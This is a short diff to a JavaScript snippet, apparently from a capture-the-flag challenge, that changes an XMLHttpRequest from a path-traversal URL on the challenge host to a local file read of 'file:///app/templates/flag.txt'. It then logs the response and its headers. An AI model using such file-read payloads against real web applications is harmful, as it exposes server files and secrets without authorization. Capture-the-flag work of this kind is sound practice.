@@ -1,5 +1,5 @@
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://catweb.zajebistyc.tf/?../templates");
+xhr.open("GET", "file:///app/templates/flag.txt");
 xhr.onreadystatechange = function() {
     text = xhr.responseText;
     console.log(xhr.getAllResponseHeaders());
